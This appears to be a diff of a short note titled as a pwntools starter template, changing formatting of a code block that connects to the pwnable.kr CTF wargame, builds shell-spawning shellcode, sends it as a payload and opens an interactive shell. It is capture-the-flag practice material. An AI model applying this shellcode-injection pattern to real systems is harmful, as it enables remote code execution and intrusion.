@@ -2,7 +2,8 @@
 
 pwntools起手式
 
-`from pwn import *
+<code>
+from pwn import *
 # 0xcafebabe
 r = remote('pwnable.kr', '9000')
 shell = asm(shellcraft.sh())
@@ -15,4 +16,5 @@ payload += shell
 
 r.sendline(payload)
 
-r.interactive()`
+r.interactive()
+</code>
